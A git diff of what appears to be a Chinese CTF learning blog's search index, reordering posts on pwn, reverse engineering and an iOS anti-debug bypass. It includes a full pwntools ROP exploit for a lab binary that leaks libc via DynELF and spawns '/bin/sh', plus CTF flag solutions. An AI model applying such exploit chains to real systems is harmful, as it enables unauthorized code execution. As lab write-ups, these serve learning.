     <title>memset函数的用法</title>
     <url>/2016/10/26/memset%E5%87%BD%E6%95%B0%E7%9A%84%E7%94%A8%E6%B3%95/</url>
     <content><![CDATA[<p>在通过IDA逆向伪代码分析程序的时候，经常会遇到memset()这个函数，格式一般如下所示：<br><a id="more"></a></p>
@@ -703,8 +593,8 @@ io.sendline(payload)
 io.interactive()
 </code></pre>]]></content>
       <tags>
-        <tag>pwn</tag>
         <tag>writeup</tag>
+        <tag>pwn</tag>
         <tag>漏洞</tag>
       </tags>
   </entry>
@@ -917,8 +807,8 @@ r.sendline(payload)
 r.interactive()
 </code></pre>]]></content>
       <tags>
-        <tag>pwn</tag>
         <tag>writeup</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -1344,71 +1234,6 @@ p.send(payload3)
       </tags>
   </entry>
   <entry>
-    <title>pwn学习之DynELF的使用</title>
-    <url>/2016/11/19/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8BDynELF%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。<br><a id="more"></a></p>
-<h2 id="leak函数"><a href="#leak函数" class="headerlink" title="leak函数"></a>leak函数</h2><pre><code>#!python
-def leak(address):
-    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
-    p.send(payload1)
-    data = p.recv(4)
-    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
-return data
-</code></pre><p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./test2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。</p>
-<h2 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h2><p>通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。所以首先要找到bss段的地址通过readelf -S level2这个命令就可以获取到bss段的地址了。</p>
-<p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。</p>
-<p>最后需要寻找的就是vulfun_add,直接用gdb反编译一下程序就可以了。</p>
-<pre><code>da$ disassemble vlun_fun 
-Dump of assembler code for function vlun_fun:
-   0x0804844d &lt;+0&gt;:    push   ebp
-   0x0804844e &lt;+1&gt;:    mov    ebp,esp
-   0x08048450 &lt;+3&gt;:    sub    esp,0x98
-   0x08048456 &lt;+9&gt;:    mov    DWORD PTR [esp+0x8],0x100
-   0x0804845e &lt;+17&gt;:    lea    eax,[ebp-0x88]
-   0x08048464 &lt;+23&gt;:    mov    DWORD PTR [esp+0x4],eax
-   0x08048468 &lt;+27&gt;:    mov    DWORD PTR [esp],0x0
-   0x0804846f &lt;+34&gt;:    call   0x8048310 &lt;read@plt&gt;
-   0x08048474 &lt;+39&gt;:    leave  
-   0x08048475 &lt;+40&gt;:    ret    
-</code></pre><p>和明显地址是0x0804844d</p>
-<h2 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h2><p>整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:</p>
-<pre><code>#!python
-#!/usr/bin/env python
-from pwn import *
-elf = ELF(&apos;./test2&apos;)
-plt_write = elf.symbols[&apos;write&apos;]
-plt_read = elf.symbols[&apos;read&apos;]
-vulfun_addr = 0x0804844d
-
-def leak(address):
-    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
-    p.send(payload1)
-    data = p.recv(4)
-    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
-    return data
-p = process(&apos;./test2&apos;)
-gdb.attach(p,&quot;b *0x804850d&quot;)
-#p = remote(&apos;127.0.0.1&apos;, 10002)
-d = DynELF(leak, elf=ELF(&apos;./test2&apos;))
-system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)
-print &quot;system_addr=&quot; + hex(system_addr)
-bss_addr = 0x0804a024
-pppr = 0x804850d
-payload2 = &apos;a&apos;*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
-payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
-payload2 += &apos;C&apos; * (256 - len(payload2))
-#ss = raw_input()
-print &quot;\n###sending payload2 ...###&quot;
-p.send(payload2)
-p.send(&quot;/bin/sh\0&quot;)
-p.interactive()
-</code></pre><p>这个exp在32kali上可以获得权限，在我的64位Ubuntu上无法获得权限，不知道为什么，纠结。。。。。。</p>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>pwn学习rop之x86篇</title>
     <url>/2016/11/19/pwn%E5%AD%A6%E4%B9%A0rop%E4%B9%8Bx86%E7%AF%87/</url>
     <content><![CDATA[<p>这段时间自学了蒸米大神写的一步一步学rop系列，以下都是我的学习心得。。。<br><a id="more"></a></p>
@@ -1571,6 +1396,144 @@ p.interactive()
 ]]></content>
       <tags>
         <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn学习之DynELF的使用</title>
+    <url>/2016/11/19/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8BDynELF%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。<br><a id="more"></a></p>
+<h2 id="leak函数"><a href="#leak函数" class="headerlink" title="leak函数"></a>leak函数</h2><pre><code>#!python
+def leak(address):
+    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
+    p.send(payload1)
+    data = p.recv(4)
+    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
+return data
+</code></pre><p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./test2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。</p>
+<h2 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h2><p>通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。所以首先要找到bss段的地址通过readelf -S level2这个命令就可以获取到bss段的地址了。</p>
+<p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。</p>
+<p>最后需要寻找的就是vulfun_add,直接用gdb反编译一下程序就可以了。</p>
+<pre><code>da$ disassemble vlun_fun 
+Dump of assembler code for function vlun_fun:
+   0x0804844d &lt;+0&gt;:    push   ebp
+   0x0804844e &lt;+1&gt;:    mov    ebp,esp
+   0x08048450 &lt;+3&gt;:    sub    esp,0x98
+   0x08048456 &lt;+9&gt;:    mov    DWORD PTR [esp+0x8],0x100
+   0x0804845e &lt;+17&gt;:    lea    eax,[ebp-0x88]
+   0x08048464 &lt;+23&gt;:    mov    DWORD PTR [esp+0x4],eax
+   0x08048468 &lt;+27&gt;:    mov    DWORD PTR [esp],0x0
+   0x0804846f &lt;+34&gt;:    call   0x8048310 &lt;read@plt&gt;
+   0x08048474 &lt;+39&gt;:    leave  
+   0x08048475 &lt;+40&gt;:    ret    
+</code></pre><p>和明显地址是0x0804844d</p>
+<h2 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h2><p>整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:</p>
+<pre><code>#!python
+#!/usr/bin/env python
+from pwn import *
+elf = ELF(&apos;./test2&apos;)
+plt_write = elf.symbols[&apos;write&apos;]
+plt_read = elf.symbols[&apos;read&apos;]
+vulfun_addr = 0x0804844d
+
+def leak(address):
+    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
+    p.send(payload1)
+    data = p.recv(4)
+    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
+    return data
+p = process(&apos;./test2&apos;)
+gdb.attach(p,&quot;b *0x804850d&quot;)
+#p = remote(&apos;127.0.0.1&apos;, 10002)
+d = DynELF(leak, elf=ELF(&apos;./test2&apos;))
+system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)
+print &quot;system_addr=&quot; + hex(system_addr)
+bss_addr = 0x0804a024
+pppr = 0x804850d
+payload2 = &apos;a&apos;*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
+payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
+payload2 += &apos;C&apos; * (256 - len(payload2))
+#ss = raw_input()
+print &quot;\n###sending payload2 ...###&quot;
+p.send(payload2)
+p.send(&quot;/bin/sh\0&quot;)
+p.interactive()
+</code></pre><p>这个exp在32kali上可以获得权限，在我的64位Ubuntu上无法获得权限，不知道为什么，纠结。。。。。。</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python基于numpy解方程组</title>
+    <url>/2016/11/28/python%E5%9F%BA%E4%BA%8Enumpy%E8%A7%A3%E6%96%B9%E7%A8%8B%E7%BB%84/</url>
+    <content><![CDATA[<p>前两天在做hctf的时候遇到一个题目，前年的400分，通过IDA分析可以看出就是一个有22个未知数的方程组的求解。<br><a id="more"></a></p>
+<p>看了前年的writeup加上一位大牛的指点，通过numpy这个包写了python脚本，终于得到了flag。</p>
+<pre><code>import sys
+import numpy
+verify=[
+0x83CD50,
+0x706048,
+0xA9AC74,
+0x9A4AF2,
+0x9F79A0,
+0x7F51A2,
+0x7E4CD8,
+0x7038B0,
+0x7B3708,
+0x687078,
+0x806066,
+0x8F2F2E,
+0x928B34,
+0x7FEDDC,
+0x825768,
+0xACB91E,
+0x90402E,
+0x6F7386,
+0xA01C72,
+0x7C7250,
+0x7AB115,
+0x893C38
+]//这一个数组里包含的是方程组的结果
+matrix=[[8923, 659, 1303, 1949, 4447, 3527, 757, 367, 5507, 7907, 691, 9629, 5303, 8117, 9103, 9391, 89, 3361, 751, 9067, 5417, 6829],
+        [9067, 1259, 107, 8597, 4229, 1213, 8831, 3259, 269, 5323, 769, 1237, 5501, 6763, 8053, 67, 3163, 3863, 4447, 5569, 4357, 5503],
+        [9533, 23, 1973, 8269, 6961, 8929, 6301, 2791, 4861, 8053, 1609, 8219, 911, 7583, 6143, 2953, 7247, 6131, 7853, 4451, 7187, 8629],
+        [1039, 389, 1487, 5987, 937, 239, 3583, 2897, 8893, 3307, 7459, 8521, 9769, 9689, 6959, 7949, 9137, 3461, 4229, 9059, 7177, 7643],
+        [7853, 6271, 9371, 1613, 73, 8243, 9013, 919, 5387, 2207, 6211, 139, 5077, 7211, 2053, 8443, 4421, 5717, 8779, 8971, 6337, 7159],
+        [3019, 8377, 1613, 1973, 3923, 8821, 797, 4969, 7643, 7297, 2381, 4679, 5869, 647, 7411, 3329, 6199, 7349, 4969, 8731, 877, 1039],
+        [3089, 9859, 7159, 227, 271, 8161, 1051, 5701, 1259, 1361, 3673, 8311, 4679, 7877, 2621, 991, 9949, 683, 743, 6079, 2473, 4519],
+        [1259, 4651, 5479, 4951, 4657, 4591, 509, 3821, 6661, 4127, 2011, 4547, 7621, 5261, 5261, 2003, 4871, 457, 2083, 4561, 6947, 1187],
+        [4703, 9629, 3769, 2003, 1297, 4283, 2381, 8429, 7057, 9371, 4483, 4099, 1873, 499, 7583, 5897, 937, 727, 241, 4799, 6361, 5531],
+        [283, 5591, 151, 2113, 7229, 307, 3851, 8963, 2777, 7757, 8831, 17, 8563, 1543, 8243, 3529, 3833, 2411, 2897, 19, 3559, 853],
+        [9467, 2207, 2269, 2083, 7741, 5801, 2633, 349, 9257, 479, 331, 7649, 5393, 887, 6329, 4243, 3329, 7121, 4001, 6043, 8263, 3253],
+        [4993, 7577, 6833, 661, 4129, 67, 2791, 3121, 4597, 8053, 8147, 1619, 5801, 6173, 127, 8179, 8093, 9319, 1063, 9157, 7817, 2341],
+        [1493, 9137,9787, 617, 5557, 8387, 4219, 3301, 251, 3203, 8443, 2521, 2887, 2437, 7883, 5653, 3907, 4457, 9091, 523, 887, 8101],
+        [9467, 2251, 9067, 4153,557, 4999, 5669, 9343, 7949, 7019, 113, 1801, 1867, 1187, 3541, 5527, 2347, 4813, 3019, 683, 6869, 5051],
+        [7333, 8677, 3557, 4099, 5279, 449, 2099, 8929, 5393, 1933,9157, 6827, 467, 3299, 443, 3739, 823, 7499, 691, 2467, 281, 4049],
+        [7489,739, 9769, 7963, 5651, 7691, 947, 8537, 4943, 1187, 4651, 9011, 6359, 1063, 7541, 9187, 2551, 7649, 4001, 3187, 6199, 7433],
+        [5653, 9349, 9419, 2459, 2423, 1823, 1291,2423, 3671, 4673, 1033, 8389, 2777, 8629, 6203, 6673, 1877, 7583, 5077, 9227, 6037, 2339],
+        [1663, 3529, 9631, 6833,17, 3697, 4327, 6053, 7639, 6679, 797, 3209, 3191, 3259, 5563, 5717, 3181, 1571, 751, 1163, 211, 4421],
+        [2273, 9341, 8081, 9311, 41, 4241, 1279, 4483, 6581, 6863, 7583, 4129, 1543, 5651, 4357,9521, 5557, 11, 7723, 2441, 6733, 6521],
+        [1171, 241,9851, 3583, 1609, 43, 9281, 5867, 2819, 5659, 4493, 223, 2767, 3221, 6173, 6947, 5897, 6113, 6737, 3989, 9733, 3467],
+        [173, 2099, 2953, 7243, 4987, 1723, 2657, 1213, 2731, 7507, 9721, 4637, 9203, 5407, 3169, 5003, 8681,2, 3329, 5843, 8017, 83],
+        [5119, 3109, 8369, 7993, 2927, 127, 5233, 4783, 5171, 3907, 1613, 4567, 3343, 2617, 5387, 8713, 7829, 3559, 419, 9931, 6067, 4481]
+        ]//这一个数组里包含的是方程组的系数
+print len(matrix)
+for i in matrix:
+    if len(i)==21:
+        print i
+result  = [104,99,116,102,123,83,48,95,84,51,114,114,49,98,49,101,95,73,99,49,49,125]
+if __name__ == &apos;__main__&apos; :
+       #gen_matrix()
+       verify   = numpy.array(verify )
+       matrix   = numpy.array(matrix )
+       print numpy.linalg.solve(matrix,verify)//解方程组
+       #print result
+       for   x in xrange(len(result)):
+              sys.stdout.write(chr(result[x]))
+</code></pre>]]></content>
+      <tags>
+        <tag>python</tag>
+        <tag>reverse</tag>
       </tags>
   </entry>
   <entry>
@@ -1912,75 +1875,22 @@ print(flag)
       </tags>
   </entry>
   <entry>
-    <title>python基于numpy解方程组</title>
-    <url>/2016/11/28/python%E5%9F%BA%E4%BA%8Enumpy%E8%A7%A3%E6%96%B9%E7%A8%8B%E7%BB%84/</url>
-    <content><![CDATA[<p>前两天在做hctf的时候遇到一个题目，前年的400分，通过IDA分析可以看出就是一个有22个未知数的方程组的求解。<br><a id="more"></a></p>
-<p>看了前年的writeup加上一位大牛的指点，通过numpy这个包写了python脚本，终于得到了flag。</p>
-<pre><code>import sys
-import numpy
-verify=[
-0x83CD50,
-0x706048,
-0xA9AC74,
-0x9A4AF2,
-0x9F79A0,
-0x7F51A2,
-0x7E4CD8,
-0x7038B0,
-0x7B3708,
-0x687078,
-0x806066,
-0x8F2F2E,
-0x928B34,
-0x7FEDDC,
-0x825768,
-0xACB91E,
-0x90402E,
-0x6F7386,
-0xA01C72,
-0x7C7250,
-0x7AB115,
-0x893C38
-]//这一个数组里包含的是方程组的结果
-matrix=[[8923, 659, 1303, 1949, 4447, 3527, 757, 367, 5507, 7907, 691, 9629, 5303, 8117, 9103, 9391, 89, 3361, 751, 9067, 5417, 6829],
-        [9067, 1259, 107, 8597, 4229, 1213, 8831, 3259, 269, 5323, 769, 1237, 5501, 6763, 8053, 67, 3163, 3863, 4447, 5569, 4357, 5503],
-        [9533, 23, 1973, 8269, 6961, 8929, 6301, 2791, 4861, 8053, 1609, 8219, 911, 7583, 6143, 2953, 7247, 6131, 7853, 4451, 7187, 8629],
-        [1039, 389, 1487, 5987, 937, 239, 3583, 2897, 8893, 3307, 7459, 8521, 9769, 9689, 6959, 7949, 9137, 3461, 4229, 9059, 7177, 7643],
-        [7853, 6271, 9371, 1613, 73, 8243, 9013, 919, 5387, 2207, 6211, 139, 5077, 7211, 2053, 8443, 4421, 5717, 8779, 8971, 6337, 7159],
-        [3019, 8377, 1613, 1973, 3923, 8821, 797, 4969, 7643, 7297, 2381, 4679, 5869, 647, 7411, 3329, 6199, 7349, 4969, 8731, 877, 1039],
-        [3089, 9859, 7159, 227, 271, 8161, 1051, 5701, 1259, 1361, 3673, 8311, 4679, 7877, 2621, 991, 9949, 683, 743, 6079, 2473, 4519],
-        [1259, 4651, 5479, 4951, 4657, 4591, 509, 3821, 6661, 4127, 2011, 4547, 7621, 5261, 5261, 2003, 4871, 457, 2083, 4561, 6947, 1187],
-        [4703, 9629, 3769, 2003, 1297, 4283, 2381, 8429, 7057, 9371, 4483, 4099, 1873, 499, 7583, 5897, 937, 727, 241, 4799, 6361, 5531],
-        [283, 5591, 151, 2113, 7229, 307, 3851, 8963, 2777, 7757, 8831, 17, 8563, 1543, 8243, 3529, 3833, 2411, 2897, 19, 3559, 853],
-        [9467, 2207, 2269, 2083, 7741, 5801, 2633, 349, 9257, 479, 331, 7649, 5393, 887, 6329, 4243, 3329, 7121, 4001, 6043, 8263, 3253],
-        [4993, 7577, 6833, 661, 4129, 67, 2791, 3121, 4597, 8053, 8147, 1619, 5801, 6173, 127, 8179, 8093, 9319, 1063, 9157, 7817, 2341],
-        [1493, 9137,9787, 617, 5557, 8387, 4219, 3301, 251, 3203, 8443, 2521, 2887, 2437, 7883, 5653, 3907, 4457, 9091, 523, 887, 8101],
-        [9467, 2251, 9067, 4153,557, 4999, 5669, 9343, 7949, 7019, 113, 1801, 1867, 1187, 3541, 5527, 2347, 4813, 3019, 683, 6869, 5051],
-        [7333, 8677, 3557, 4099, 5279, 449, 2099, 8929, 5393, 1933,9157, 6827, 467, 3299, 443, 3739, 823, 7499, 691, 2467, 281, 4049],
-        [7489,739, 9769, 7963, 5651, 7691, 947, 8537, 4943, 1187, 4651, 9011, 6359, 1063, 7541, 9187, 2551, 7649, 4001, 3187, 6199, 7433],
-        [5653, 9349, 9419, 2459, 2423, 1823, 1291,2423, 3671, 4673, 1033, 8389, 2777, 8629, 6203, 6673, 1877, 7583, 5077, 9227, 6037, 2339],
-        [1663, 3529, 9631, 6833,17, 3697, 4327, 6053, 7639, 6679, 797, 3209, 3191, 3259, 5563, 5717, 3181, 1571, 751, 1163, 211, 4421],
-        [2273, 9341, 8081, 9311, 41, 4241, 1279, 4483, 6581, 6863, 7583, 4129, 1543, 5651, 4357,9521, 5557, 11, 7723, 2441, 6733, 6521],
-        [1171, 241,9851, 3583, 1609, 43, 9281, 5867, 2819, 5659, 4493, 223, 2767, 3221, 6173, 6947, 5897, 6113, 6737, 3989, 9733, 3467],
-        [173, 2099, 2953, 7243, 4987, 1723, 2657, 1213, 2731, 7507, 9721, 4637, 9203, 5407, 3169, 5003, 8681,2, 3329, 5843, 8017, 83],
-        [5119, 3109, 8369, 7993, 2927, 127, 5233, 4783, 5171, 3907, 1613, 4567, 3343, 2617, 5387, 8713, 7829, 3559, 419, 9931, 6067, 4481]
-        ]//这一个数组里包含的是方程组的系数
-print len(matrix)
-for i in matrix:
-    if len(i)==21:
-        print i
-result  = [104,99,116,102,123,83,48,95,84,51,114,114,49,98,49,101,95,73,99,49,49,125]
-if __name__ == &apos;__main__&apos; :
-       #gen_matrix()
-       verify   = numpy.array(verify )
-       matrix   = numpy.array(matrix )
-       print numpy.linalg.solve(matrix,verify)//解方程组
-       #print result
-       for   x in xrange(len(result)):
-              sys.stdout.write(chr(result[x]))
-</code></pre>]]></content>
+    <title>reverse之第六更</title>
+    <url>/2017/01/24/reverse%E4%B9%8B%E7%AC%AC%E5%85%AD%E6%9B%B4/</url>
+    <content><![CDATA[<p>本题同样也涉及到反调试技术，题目提供一个exe和一个dll，用IDA分析程序：<br><a id="more"></a></p>
+<p><img src="http://p1.bpimg.com/567571/70a93b006a742471.png" alt=""></p>
+<p>loc_402000是验证flag是否正确的函数，点开一看。。。一脸懵逼</p>
+<p><img src="http://p1.bqimg.com/567571/b0ab23cb23308271.png" alt=""></p>
+<p>应该是SMC，所谓SMC就是相当于把某些重要函数在二进制文件中进行加密，这些函数在程序执行的时候会动态解密。然而OD中会出现反调试。</p>
+<p>接下来运行程序，然后将之debugger attach到IDA上，加密数据段就解密了，不过可能是我的IDA的问题，这个过程十分漫长。。。。。。。</p>
+<p>加载完成之后</p>
+<p><img src="http://p1.bpimg.com/567571/e2027be2a13e885b.png" alt=""></p>
+<p>在loc_402000位置创建一下函数，F5反编译。发现这个函数首先为得到re1DLL.dll的Trololololololol数组，然后不断将用户输入与Trololololololol数组中的某些元素进行比较，前面一些比较指令相对比较简单，得到了flag的前半部分ISCC{N3v3r_7r4apped_6y_4nt!_XXXXX}<br>最后的XXXXX是通过re1DLL.dll的Derpaherp函数进行set的</p>
+<p> <img src="http://i1.piimg.com/567571/c77f2dcf766c9a0c.png" alt=""></p>
+<p>Derpaherp是有三个参数的，这里只有一个是IDA F5的锅，调到汇编仍然可以看到调用Derpaherp之前push了三个参数，最后会有一个strcmp，v13和unk_405048比较，我把unk_405048导出来发现其为ad42f6697b035b7580e4fef93be20b4d，是Md5，拖入cmd5.com跑了一下，跑出来是debug。由此也可以断定Derpaherp内部其实是实现了Md5计算，所以最后的flag为ISCC{N3v3r_7r4apped_6y_4nt!_debug}</p>
+]]></content>
       <tags>
-        <tag>python</tag>
+        <tag>writeup</tag>
         <tag>reverse</tag>
       </tags>
   </entry>
@@ -2547,26 +2457,6 @@ if __name__ == &apos;__main__&apos; :
       </tags>
   </entry>
   <entry>
-    <title>reverse之第六更</title>
-    <url>/2017/01/24/reverse%E4%B9%8B%E7%AC%AC%E5%85%AD%E6%9B%B4/</url>
-    <content><![CDATA[<p>本题同样也涉及到反调试技术，题目提供一个exe和一个dll，用IDA分析程序：<br><a id="more"></a></p>
-<p><img src="http://p1.bpimg.com/567571/70a93b006a742471.png" alt=""></p>
-<p>loc_402000是验证flag是否正确的函数，点开一看。。。一脸懵逼</p>
-<p><img src="http://p1.bqimg.com/567571/b0ab23cb23308271.png" alt=""></p>
-<p>应该是SMC，所谓SMC就是相当于把某些重要函数在二进制文件中进行加密，这些函数在程序执行的时候会动态解密。然而OD中会出现反调试。</p>
-<p>接下来运行程序，然后将之debugger attach到IDA上，加密数据段就解密了，不过可能是我的IDA的问题，这个过程十分漫长。。。。。。。</p>
-<p>加载完成之后</p>
-<p><img src="http://p1.bpimg.com/567571/e2027be2a13e885b.png" alt=""></p>
-<p>在loc_402000位置创建一下函数，F5反编译。发现这个函数首先为得到re1DLL.dll的Trololololololol数组，然后不断将用户输入与Trololololololol数组中的某些元素进行比较，前面一些比较指令相对比较简单，得到了flag的前半部分ISCC{N3v3r_7r4apped_6y_4nt!_XXXXX}<br>最后的XXXXX是通过re1DLL.dll的Derpaherp函数进行set的</p>
-<p> <img src="http://i1.piimg.com/567571/c77f2dcf766c9a0c.png" alt=""></p>
-<p>Derpaherp是有三个参数的，这里只有一个是IDA F5的锅，调到汇编仍然可以看到调用Derpaherp之前push了三个参数，最后会有一个strcmp，v13和unk_405048比较，我把unk_405048导出来发现其为ad42f6697b035b7580e4fef93be20b4d，是Md5，拖入cmd5.com跑了一下，跑出来是debug。由此也可以断定Derpaherp内部其实是实现了Md5计算，所以最后的flag为ISCC{N3v3r_7r4apped_6y_4nt!_debug}</p>
-]]></content>
-      <tags>
-        <tag>writeup</tag>
-        <tag>reverse</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>reverse之第十更</title>
     <url>/2017/02/05/reverse%E4%B9%8B%E7%AC%AC%E5%8D%81%E6%9B%B4/</url>
     <content><![CDATA[<p>一道比较复杂的算法Crack，主要考查CRC校验算法，AES加密，以及base64加密算法。<br><a id="more"></a><br>程序运行之后发现提示内容是Try angin！但是搜索字符串并没有，但是看到一个很像base64的字符串，过去发现各种算法以及调用，在函数开头下断，果然加密算法都在这个地方。</p>
@@ -2807,41 +2697,6 @@ f.close()
       </tags>
   </entry>
   <entry>
-    <title>xortool的安装使用</title>
-    <url>/2016/10/05/xortool%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>Xortool.py是一款基于python的脚本，用来完成一些xor分析。<br><a id="more"></a></p>
-<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><ul>
-<li>猜想key的长度</li>
-<li>猜想key的值</li>
-<li><p>解密一些经过xoe加密的文件</p>
-<h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>xortool依赖于python的命令行参数解释器docopt。</p>
-<p>  $ sudo pip install docopt<br>Then install xortool:</p>
-<p>  $ cd /data/src/<br>  $ git clone <a href="https://github.com/hellman/xortool.git" target="_blank" rel="external">https://github.com/hellman/xortool.git</a><br>  $ cd xortool/<br>  $ sudo python setup.py install</p>
-<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2></li>
-</ul>
-<h3 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h3><pre><code>-l,--key-length
-    length of the key (integer)
--c,--char
-    most possible char (one char or hex code)
--m,--max-keylen=32
-    maximum key length to probe (integer)
--x,--hex
-    input is hex-encoded str
--b,--brute-chars
-    brute force all possible characters
--o,--brute-printable
-    same as -b but will only use printable characters for keys
-</code></pre><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>详细功能参见<br><img src="https://www.aldeid.com/wiki/Xortool" alt="官方说明"><br>这里和大家分享一个解密文件的功能，在xortool里有一个名为xortool-xor的文件，它可以将xor加密的文件解密。</p>
-<p>有一个加密的文件为flag.encrypted,异或加密的密钥是dc647eb65e6711e155375218212b3964，</p>
-<p><img src="http://i1.piimg.com/567571/6931a5b710e21777.png" alt=""></p>
-<p>这样就解密了。。。</p>
-]]></content>
-      <tags>
-        <tag>ctf</tag>
-        <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>reverse第二更之问鼎杯2106-6-2</title>
     <url>/2016/12/05/reverse%E7%AC%AC%E4%BA%8C%E6%9B%B4%E4%B9%8B%E9%97%AE%E9%BC%8E%E6%9D%AF2106-6-2/</url>
     <content><![CDATA[<p>题目提供了一个exe程序和一个文本readme.txt，txt内容如下：<br><a id="more"></a></p>
@@ -2907,30 +2762,38 @@ name[5]=&apos;b&apos;,name[9]=&apos;0&apos;,name[10]=&apos;_&apos;,name[11]=&apo
       </tags>
   </entry>
   <entry>
-    <title>动态绕过iOS内联svc反调试</title>
-    <url>/2020/04/30/%E5%8A%A8%E6%80%81%E7%BB%95%E8%BF%87iOS%E5%86%85%E8%81%94svc%E5%8F%8D%E8%B0%83%E8%AF%95/</url>
-    <content><![CDATA[<p>之前在jmpews大神的<a href="http://bbs.iosre.com/t/topic/9351&quot;With a Title&quot;" target="_blank" rel="external">反调试与绕过的奇淫技巧</a>以及AloneMonkey大神的<a href="http://bbs.iosre.com/t/topic/8179" target="_blank" rel="external">关于反调试&amp;反反调试那些事</a>这两篇文章中学习到不少关于iOS反调试绕过的姿势技巧，本篇主要记录一下自己在实际逆向过程中遇到的关于svc内联反调试的绕过过程。<br><a id="more"></a></p>
-<h1 id="iOS反调试简介"><a href="#iOS反调试简介" class="headerlink" title="iOS反调试简介"></a>iOS反调试简介</h1><p>iOS的反调试目前常见只有几种，主要是ptrace、sysctl、syscall几种，这里我就不照本宣科的去介绍这几种反调试的原理了，我上面提到的两位大神的文章中有十分详细的说明。</p>
-<p>由于以上三种方式的反调试相对比较容易绕过，一般通过Tweak编写hook插件就可以解决了，下面贴上AloneMonkey的一个脚本，足以绕过这些反调试<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;substrate.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;sys/sysctl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*orig_ptrace)</span> <span class="params">(<span class="keyword">int</span> request, <span class="keyword">pid_t</span> pid, <span class="keyword">caddr_t</span> addr, <span class="keyword">int</span> data)</span></span>;</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_ptrace</span> <span class="params">(<span class="keyword">int</span> request, <span class="keyword">pid_t</span> pid, <span class="keyword">caddr_t</span> addr, <span class="keyword">int</span> data)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(request == <span class="number">31</span>)&#123;</div><div class="line">		NSLog(@<span 